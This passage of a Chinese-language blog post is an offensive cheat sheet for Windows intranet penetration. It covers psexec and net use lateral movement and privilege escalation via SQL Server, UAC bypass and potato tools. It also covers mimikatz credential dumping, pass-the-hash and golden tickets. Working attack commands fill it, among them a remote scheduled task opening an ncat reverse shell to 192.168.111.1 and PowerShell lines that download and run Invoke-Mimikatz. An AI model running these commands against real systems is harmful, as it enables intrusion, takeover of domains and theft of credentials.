<li><code>psexec -accepteula @ips.txt -u [username] -p [password] -c</code> <a href="#1.bat">1.bat</a> #批量登录</li>
<li><code>tasklist /v | find [username]</code>  #查找关于某用户进程，存在说明某用户登录过</li>
<li><code>net use \\IP\ipc$</code> #建立空连接</li>
<li><code>net use \\IP\c$</code></li>
<li><code>dir \\IP\c$</code> #列目录</li>
<li><code>net use z: \\IP\c$</code> #映射盘符到本地</li>
<li><code>net use \\IP\C$ /user:[username] [password]</code> #建立非空连接</li>
<li><code>net use \\IP\IPC$ [password] /user:[username]</code> #建立非空连接</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/2.png" alt></li>
<li><code>net use z: \\IP\c$ /user:[username] [password]</code> #映射盘符C盘到本地Z盘</li>
<li><code>net use \\IP\c$ /del</code> #删除共享链接</li>
<li><code>net use * /del</code> #删除共享映射</li>
<li><code>net time \\computername/IP</code> #查看目标的时间</li>
<li><code>at \\[computername/ip] 23:59 %path%\file</code> #计划任务执行文件 </li>
<li><code>at \\IP 17:06 &quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot;</code></li>
<li><code>schtasks /query</code> #列出所有计划任务</li>
<li><code>schtasks /create /sc minute /tn test /tr c:\windows\notepad.exe</code> #本地创建计划任务</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/95.png" alt></li>
<li><code>schtasks /delete /tn test</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/96.png" alt></li>
<li><code>schtasks /create /s [远程主机] /u username /p password /ru runasuser /rp runaspassword /sc hourly /tn doc /tr notepad</code> #远程创建计划任务，/sc：[minute/hourly/daily/weekly/等]，/tn：[自定义计划任务名称]，/tr：[计划运行的程序和文件名]</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/90.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/91.png" alt></li>
<li><code>/st 18:00</code> #计划18点开始，小时必须2位数</li>
<li><code>/sc minute /mo 1</code> #每隔分钟执行一次计划任务</li>
<li><code>schtasks /delete /s 192.168.111.16 /u god\administrator /p Hongrisec@2019  /tn test123</code> #远程删除计划任务</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/92.png" alt></li>
<li><code>schtasks /create /s 192.168.111.16 /u god\administrator /p Hongrisec@2019 /tn reverse_shell /sc minute /tr &quot;ncat 192.168.111.1 8888 -e cmd&quot;</code> #远程创建计划任务反弹shell</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/93.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/94.png" alt></li>
<li><code>copy f:\\1.txt \\IP\c$</code> #复制文件到服务器C盘</li>
<li><code>copy \\IP\c$\1.txt f:\\1.txt</code> #复制文件到本地</li>
</ol>
<p><span id="1.bat">1.bat</span></p>
<pre><code>@echo off
for /L %%i in (1,1,254) do (
    ::ping -n 1 %1%%i | findstr &quot;TTL&quot;&gt;nul &amp;&amp; (D:\\test\\psexec.exe \\%1%%i -u administrator -p &lt;password&gt; -h cmd)
    start D:\\test\\psexec.exe -accepteula \\%1%%i -u &lt;domain\&gt;administrator -p &lt;password&gt; -h cmd
    ::start cmd /c D:\\test\\psexec.exe -accepteula \\%1%%i -u &lt;domain\&gt;administrator -p &lt;password&gt; -h cmd
)
pause</code></pre><p><strong>MSF psexec</strong></p>
<ol>
<li><code>use exploit/windows/smb/psexec</code></li>
<li><code>set payload windows/x64/meterpreter/reverse_tcp</code></li>
<li><code>set lhost IP</code></li>
<li><code>set lport port</code></li>
<li><code>set smbuser username</code></li>
<li><code>set smbpass password</code></li>
<li><code>exploit</code></li>
</ol>
<h2 id="0x31-windows提权"><a href="#0x31-windows提权" class="headerlink" title="0x31 windows提权"></a>0x31 windows提权</h2><ol>
<li>补丁对比提权建议工具：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
<li>Windows内核漏洞利用工具：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li>
<li>利用漏洞执行exp，添加本地管理员</li>
<li><code>net user username password /add</code></li>
<li><code>net  localgroup administrators username /add</code></li>
<li>添加域用户</li>
<li><code>net user username password /add /domain</code></li>
<li><code>net localgroup administrators workgroup\username /add</code></li>
</ol>
<p><strong>CobaltStrike提权</strong><br><strong>Metasploit Framework提权</strong></p>
<p><strong>mysql提权</strong></p>
<ol>
<li>UDF提权：通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。</li>
<li>MOF提权：在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，通过代码存储到这个mof文件中，就可以实现权限提升。</li>
<li>启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。</li>
</ol>
<p><strong>sqlserver提权</strong></p>
<ol>
<li>xp_cmdshell提权</li>
<li><code>exec sp_configure &#39;show advanced options&#39;,1; reconfigure;</code></li>
<li><code>exec sp_configure &#39;xp_cmdshell&#39;,1; reconfigure;</code></li>
<li><code>exec master..xp_cmdshell &#39;whoami&#39;;</code></li>
</ol>
<p><strong>SP_OACreate提权</strong></p>
<ol>
<li><code>EXEC sp_configure &#39;show advanced options&#39;, 1;</code></li>
<li><code>RECONFIGURE WITH OVERRIDE;</code></li>
<li><code>EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;</code></li>
<li><code>RECONFIGURE WITH OVERRIDE;</code></li>
<li><code>EXEC sp_configure &#39;show advanced options&#39;, 0;</code></li>
<li>打开组件，2005中默认关闭<pre><code>2000系统：
declare@shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod@shell,&#39;run&#39;,null,&#39;c:\winnt\system32\cmd.exe /c net user username password /add&#39;
declare@shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod@shell,&#39;run&#39;,null,&#39;c:\winnt\system32\cmd.exe /c net localgroup administrators username /add&#39;
xp和2003系统：
declare@shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod@shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user username password /add&#39;
declare@shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod@shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net localgroup administrators username /add&#39;</code></pre></li>
</ol>
<p><strong>Bypass UAC提权</strong></p>
<ol>
<li>UAC(User Account Control，用户账号控制)</li>
<li><strong>MSF bypassuac</strong></li>
<li><code>MSF6 &gt; use exploit/windows/local/bypassuac</code></li>
<li><code>meterpreter &gt; getuid</code></li>
<li><code>meterpreter &gt; getsystem</code></li>
<li><strong>令牌窃取提权</strong></li>
<li><code>meterpreter &gt; use incognito</code></li>
<li><code>meterpreter &gt; list_tokens -u</code></li>
<li><code>meterpreter &gt; impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></li>
<li><code>meterpreter &gt; getuid</code></li>
</ol>
<p><strong>CVE-2020-0787</strong></p>
<ol>
<li>Background Intelligent Transfer Service（BITS）是其中的一个后台智能传输服务组件。BITS中存在提权漏洞，该漏洞源于该服务无法正确处理符号链接。攻击者可通过执行特制的应用程序利用该漏洞覆盖目标文件，提升权限。</li>
<li><a href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION" target="_blank" rel="noopener">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION</a></li>
</ol>
<p><strong>badpotato</strong> <a href="https://github.com/FutureBody/BadPotato" target="_blank" rel="noopener">https://github.com/FutureBody/BadPotato</a></p>
<ol>
<li>拥有SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege权限</li>
<li><code>whoami /priv</code></li>
<li><code>badpotato.exe &quot;whoami&quot;</code></li>
</ol>
<p><strong>juicy-potato</strong></p>
<ol>
<li><code>whoami</code> #NT AUTHORITY\SYSTEM</li>
<li><code>JuicyPotato.exe</code> #help</li>
<li><code>JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c &lt;clsid&gt;</code></li>
<li>clsid获取：<a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></li>
</ol>
<h3 id="windows-bypass-UAC"><a href="#windows-bypass-UAC" class="headerlink" title="windows bypass UAC"></a>windows bypass UAC</h3><ol>
<li><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></li>
</ol>
<h3 id="MS14-068-CVE-2014-6324-域控提权利用"><a href="#MS14-068-CVE-2014-6324-域控提权利用" class="headerlink" title="MS14-068(CVE-2014-6324)域控提权利用"></a><strong>MS14-068(CVE-2014-6324)域控提权利用</strong></h3><ol>
<li><code>mimikatz.exe &quot;log&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/54.png" alt></li>
<li><code>ms14-068.exe -u [username]@[domain] -p [password] -s [SID] -d [DC ip]</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/55.png" alt></li>
<li>生成缓存文件：<code>TGT_administrator@god.org.ccache</code></li>
<li>导入伪造缓存：<code>mimikatz # kerberos::ptc TGT_administrator@god.org.ccache</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/56.png" alt></li>
<li><code>net use z: \\192.168.52.138\c$</code> #映射盘符到本地</li>
<li><code>dir z:\</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/57.png" alt></li>
<li>直接执行命令：</li>
<li><code>psexec \\192.168.52.138\ cmd.exe</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/58.png" alt></li>
</ol>
<h2 id="0x32-管理员权限-多方法执行mimikatz-amp-amp-多方法获取hash"><a href="#0x32-管理员权限-多方法执行mimikatz-amp-amp-多方法获取hash" class="headerlink" title="0x32 (管理员权限)多方法执行mimikatz &amp;&amp; 多方法获取hash"></a>0x32 (管理员权限)多方法执行mimikatz &amp;&amp; 多方法获取hash</h2><ol>
<li><strong>直接执行对应版本的mimikatz.exe</strong> <a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></li>
<li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></li>
<li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::wdigest&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/13.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/33.png" alt></li>
</ol>
<ol>
<li><strong>powersploit脚本本地加载与远程加载Invoke-Mimikatz.ps1</strong> <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></li>
<li><code>import-module PATH\PowerSploit\Exfiltration\Invoke-Mimikatz.ps1</code></li>
<li><code>Invoke-Mimikatz -DumpCreds</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/14.png" alt></li>
<li><code>iex(new-object net.webclient).downloadstring(&quot;http://192.168.111.1/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&quot;);invoke-mimikatz -dumpcreds</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/15.png" alt></li>
</ol>
<ol>
<li><strong>.NET Framework执行mimikatz XML文件</strong> <a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" target="_blank" rel="noopener">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml</a></li>
<li><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\TEST\Desktop\mimikatz.xml</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/16.png" alt></li>
</ol>
<ol>
<li><strong>powersploit脚本本地加载与远程加载Get-PassHashes.ps1</strong> <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></li>
<li><code>Import-Module PATH\nishang\Gather\Get-PassHashes.ps1</code></li>
<li><code>Get-PassHashes</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/17.png" alt></li>
<li><code>iex(new-object net.webclient).downloadstring(&quot;http://192.168.111.1/nishang/Gather/Get-PassHashes.ps1&quot;);get-passhashes</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/23.png" alt></li>
</ol>
<ol>
<li><strong>cscript执行mimikatz.js</strong> <a href="https://gist.github.com/pljoel/42dae5e56a86a43612bea6961cb59d1a" target="_blank" rel="noopener">https://gist.github.com/pljoel/42dae5e56a86a43612bea6961cb59d1a</a></li>
<li><code>cscript PATH\mimikatz.js</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/18.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/19.png" alt></li>
</ol>
<p><strong>wmic 本地调用 与 远程调用 XSL（可扩展样式表语言）脚本</strong></p>
<ol>
<li><code>wmic process list /format:mimikatz.xsl</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/20.png" alt></li>
<li><code>wmic os get /format:&quot;http://192.168.111.1/mimikatz.xsl&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/21.png" alt></li>
</ol>
<p><strong>内部独白攻击：在不接触LSASS的情况下检索NTLM哈希</strong> <a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="noopener">https://github.com/eladshamir/Internal-Monologue</a></p>
<ol>
<li><code>Usage: InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False -Verbose True/False -Challenge ascii-hex</code></li>
<li><code>Example: InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/22.png" alt></li>
</ol>
<p><strong>procdump转储lsass储存的凭证</strong></p>
<ol>
<li><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></li>
<li><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/24.png" alt></li>
</ol>
<p><strong>reg导出SAM储存的凭证、powershell导出SAM储存的凭证、wmic创建C盘快照</strong></p>
<ol>
<li><code>reg save hklm\sam c:\sam 或 reg save hklm\sam c:\sam.hive</code></li>
<li><code>reg save hklm\system c:\system 或 reg save hklm\system c:\system.hive</code></li>
<li><code>reg save hklm\security c:\security 或 reg save hklm\security c:\security.hive</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/25.png" alt></li>
<li><code>powershell -exec bypass</code></li>
<li><code>Import-Module .\invoke-ninjacopy.ps1</code></li>
<li><code>Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive</code></li>
<li><code>Invoke-NinjaCopy -Path   C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/28.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/29.png" alt></li>
<li>创建先前版本的快照</li>
<li><code>wmic shadowcopy call create volume=&#39;c:\&#39;</code></li>
<li>列出系统所有快照</li>
<li><code>vssadmin list shadows</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/30.png" alt></li>
<li>从最新的快照中拷贝SAM、SYSTEM、SECURITY、（域环境文件ntds.dit）</li>
<li><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy26\Windows\system32\config\sam .</code></li>
<li><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy26\Windows\system32\config\system .</code></li>
<li><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy26\Windows\system32\config\security .</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/31.png" alt></li>
<li><code>python PATH\impacket\examples\secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/32.png" alt></li>
<li><strong>使用saminside（或Cain）破解sam.hive与system.hive</strong></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/26.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/27.png" alt></li>
</ol>
<p><strong>PwDump7获取hash</strong></p>
<ol>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/100.png" alt></li>
</ol>
<p><strong>impacket pth:(pass the hash，传递hash)</strong></p>
<ol>
<li><code>python wmiexec.py -hashes LMhash:NTLMhash [domain\]username@IP &quot;command&quot;</code></li>
<li><code>python smbexec.py -hashes LMhash:NTLMhash [domain\]username@IP</code> </li>
</ol>
<p><strong>参考</strong></p>
<ol>
<li><a href="https://mp.weixin.qq.com/s/6mwms9LtLE6cK0ukpoSMmg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6mwms9LtLE6cK0ukpoSMmg</a></li>
</ol>
<h2 id="0x33-mimikatz攻击"><a href="#0x33-mimikatz攻击" class="headerlink" title="0x33 mimikatz攻击"></a>0x33 mimikatz攻击</h2><ol>
<li>使用教程：<a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki</a></li>
<li><code>mimikatz.exe</code> #启动mimikatz</li>
<li><code>log</code> #记录命令执行日志</li>
<li><ul>
<li><code>log test.log</code> #记录命令执行日志到test.log</li>
</ul>
</li>
<li><ul>
<li><code>log /stop</code> #停止记录日志</li>
</ul>
</li>
<li><code>version</code> #版本</li>
<li><code>cls</code> #清屏</li>
<li><code>cd</code> #切换目录</li>
<li><code>exit</code> #退出</li>
<li><code>privilege::debug</code> #调试特权允许调试原本无法访问的进程。</li>
</ol>
<p><strong>sekurlsa</strong></p>
<ol>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/51.png" alt></li>
<li><code>sekurlsa::logonpasswords</code> #列出所有用户凭证</li>
<li><code>sekurlsa::tickets /export</code> #列出所有票据</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/41.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/40.png" alt></li>
<li><strong>无法抓取到明文时，传递hash攻击</strong></li>
<li><code>sekurlsa::pth /user:[username] /domain:[domain] /ntlm:[NTLM]</code> #pth：pass-the-hash，hash传递，/user:用户，/domain:域名，/ntlm:NTLM哈希</li>
<li><code>net use \\192.168.111.16\c$</code></li>
<li><code>dir \\192.168.111.16\c$</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/34.png" alt></li>
<li><code>psexec.exe \\192.168.111.16\ cmd.exe</code> #获取目标终端，执行命令</li>
<li><code>sekurlsa::msv</code> #列出LM和NTLM凭据</li>
<li><code>sekurlsa::wdigest</code> #列出WDigest凭据</li>
<li><code>sekurlsa::kerberos</code> #列出Kerberos凭证，可能存在在域上使用智能卡登录时，lsass缓存智能卡的PIN码</li>
<li><code>sekurlsa::krbtgt</code> #ERROR kuhl_m_sekurlsa_krbtgt ; KDC service not in LSASS memory</li>
<li><code>sekurlsa::ekeys</code> #列出Kerberos加密密钥，可获取aes128/aes256</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/45.png" alt></li>
<li><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:god.org /aes256:b9d153ff6f5af1e2f261c6fd976ad1527afe03498bfd2a4cd0dae2d896e02e59</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/112.png" alt></li>
<li><code>sekurlsa::dpapi</code> #列出缓存的万能钥匙</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/47.png" alt></li>
<li><code>sekurlsa::credman</code> #列出凭据管理器</li>
</ol>
<p><strong>kerberos</strong> <a href="https://tools.ietf.org/html/rfc4120#section-5.8" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc4120#section-5.8</a></p>
<ol>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/53.png" alt></li>
<li><code>kerberos::list /export(可选)</code> #列出并导出所有会话的kerberos票据（TGT、TGS）</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/35.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/38.png" alt></li>
<li><strong>黄金票据</strong></li>
<li><code>kerberos::golden /user:[用户名] /domain:[domain] /sid:[SID] /krbtgt:[krbtgt hash] /ticket:[name].kirbi</code> #sekurlsa::logonpasswords可获取用户名、域名、SID、krbtgt哈希，<code>whoami /all或/user</code>：可获取SID</li>
<li>/id:用户ID（可选），例子：<code>/id:500</code></li>
<li>/groups:用户所属的组ID（可选），管理员默认值是：513,512,520,518,519，例子：<code>/groups:513,512,520,518,519</code></li>
<li>重点是krbtgt哈希（需攻陷域控制器获取）</li>
<li>如：<code>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::</code> #主要是<code>58e91a5ac358d86513ab224312314061</code></li>
<li><code>kerberos::golden /user:administrator /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ticket:golden.kirbi</code> #SID不要最后的500</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/36.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/37.png" alt></li>
<li><code>kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /aes256:b9d153ff6f5af1e2f261c6fd976ad1527afe03498bfd2a4cd0dae2d896e02e59 /user:Administrateur /ptt</code></li>
<li>/ticket(可选)：默认ticket.kirbi</li>
<li>/ptt：文件中没有输出，仅在当前会话中注入黄金票据</li>
<li>/startoffset(可选)：开始偏移，负数表示过去，正数表示将来有一张票（翻译）</li>
<li>/endin(可选)：票据有效期</li>
<li>/renewmax(可选)：票据总有效期</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/46.png" alt></li>
<li><code>kerberos::ptt golden.kirbi</code> #ptt：pass the ticket，传递票据，TGT注入到机器上</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/39.png" alt></li>
<li><code>kerberos::tgt</code> #显示当前有关TGT会话的信息</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/42.png" alt></li>
<li>现在可挂载DC C盘</li>
<li><code>net use z: \\192.168.52.138\c$</code></li>
<li><code>net use</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/43.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/48.png" alt></li>
<li>执行DC系统命令</li>
<li><code>psexec.exe \\192.168.52.138\ cmd.exe</code></li>
<li><code>ipconfig | findstr IPv4</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/44.png" alt></li>
<li><strong>白银票据</strong></li>
<li>/target：域控全称</li>
<li>/service：要访问的服务，如http、mssql、cifs/SMB(访问网络文件共享服务，137/138/139/445)、rpcss(远程程序调用服务)</li>
<li><code>mimikatz.exe &quot;kerberos::golden /domain:域 /sdi:SID /target:域控全称 /service:要访问的服务 /rc4:ntlm /user:user /ptt&quot;</code></li>
<li><strong>TGT</strong></li>
<li><code>kerberos::purge</code> #清除当前会话的所有票证。</li>
<li><code>kerberos::hash</code> #列出hash</li>
</ol>
<p><strong>lsadump</strong> </p>
<ol>
<li>该命令转储安全帐户管理器（SAM）数据库，包含用户密码的NTLM，或包含LM哈希。</li>
<li>两种使用模式：在线（使用SYSTEM用户或token）或离线（使用SYSTEM＆SAM.hive或backup）</li>
<li><code>reg save hklm\SAM .\SAM</code></li>
<li><code>reg save hklm\SYSTEM .\SYSTEM</code></li>
<li><code>reg save hklm\SECURITY .\SECURITY</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/49.png" alt></li>
<li><code>privilege::debug</code></li>
<li><code>token::whoami</code></li>
<li><code>token::elevate</code></li>
<li><code>lsadump::sam</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/50.png" alt></li>
<li><code>lsadump::secrets</code></li>
<li><code>lsadump::cache</code></li>
<li><code>lsadump::lsa /id:500</code></li>
<li><code>lsadump::lsa /inject /name:krbtgt</code></li>
<li><code>lsadump::lsa /patch</code> #获取Krbtgt Hash，普通域用户无法获取，只能域控获取</li>
</ol>
<p><strong>misc</strong> 杂项模块</p>
<ol>
<li><code>misc::cmd</code> #启动cmd（如果管理员禁用cmd）</li>
<li><code>misc::regedit</code> #打开注册表</li>
<li><code>misc::taskmgr</code> #打开任务管理器</li>
<li><code>misc::detours</code> #列出进程及PID（尝试使用类似Detours的钩子枚举所有模块）</li>
<li><code>misc::skeleton</code> #尝试注入万能钥匙，任意账号登录，默认密码mimikatz</li>
</ol>
<p><strong>process</strong></p>
<ol>
<li><code>process::list</code> #列出所有进程</li>
</ol>
<p><strong>token</strong></p>
<ol>
<li><code>token::whoami</code> #</li>
<li><code>token::list</code> #列出进程</li>
<li><code>token::elevate</code> #提权</li>
<li><code>token::run</code></li>
<li><code>token::revert</code></li>
</ol>
<p><strong>vault</strong></p>
<ol>
<li><code>vault::list</code></li>
</ol>
<ol>
<li><code>kb2871997补丁会删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。用户可以选择将HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential更改为0来禁用。</code></li>
<li><code>winserver 2012 R2及以上版本，手动添加上述注册表的值为1，然后抓密码，发现只有wdigest能抓到明文密码了</code></li>
</ol>
<p><strong>参考：</strong></p>
<ul>
<li><a href="https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos" target="_blank" rel="noopener">https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos</a></li>
<li><a href="http://rycon.hu/papers/goldenticket.html" target="_blank" rel="noopener">http://rycon.hu/papers/goldenticket.html</a></li>
</ul>
<hr>
<h2 id="0x40-域控"><a href="#0x40-域控" class="headerlink" title="0x40 域控"></a>0x40 域控</h2><ol>
<li>vssadmin.exe：系统自带创建/删除windows驱动器的卷影副本的工具</li>
<li>检查是否存在C盘的卷影副本可用：</li>
<li>vssadmin.exe list shadows</li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/3.png" alt></li>
<li>有时候命令无法回显，如webshell，可直接输出到txt文件，或使用psexec.exe执行命令输出到txt文件</li>
<li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;vssadmin list shadows &gt; \\192.168.0.104\C$\1.txt&quot;</code></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/4.png" alt></li>
<li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/5.png" alt></li>
<li>没有！自建C盘的卷影副本，来窃取ntds.dit和system文件</li>
<li>vssadmin create shadow /for=C: &gt; 1.txt</li>
